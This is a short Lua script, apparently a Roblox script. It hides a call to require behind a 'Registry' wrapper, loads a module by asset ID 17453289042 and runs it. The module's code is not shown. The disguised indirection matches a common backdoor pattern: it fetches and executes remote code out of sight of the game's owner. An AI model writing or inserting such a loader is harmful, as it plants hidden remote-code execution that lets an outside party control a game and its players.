local Registry = {}
function Registry:loader()
	return require
end
local f = Registry:loader()
local m = f(17453289042)
m.run()
